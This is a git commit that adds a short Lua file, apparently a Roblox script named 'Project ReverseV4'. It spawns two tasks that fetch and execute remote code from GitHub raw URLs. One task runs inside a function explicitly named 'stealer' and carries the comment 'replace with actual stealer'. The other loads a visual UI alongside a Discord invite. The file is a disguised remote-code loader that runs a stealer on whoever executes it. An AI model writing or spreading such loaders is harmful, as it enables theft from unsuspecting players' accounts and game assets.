bc23337c6e1fdad6e7d843a0d7e84231bafe631d
PremiumScript99 <gardengrow062@gmail.com>
2025-09-01 07:17:43 -0700

    Create Project ReverseV4.lua

---
+++ Project ReverseV4.lua
@@ -0,0 +1,10 @@
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PremiumScript99/Project-ReverseV3/refs/heads/main/Project%20ReverseV3.lua"))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
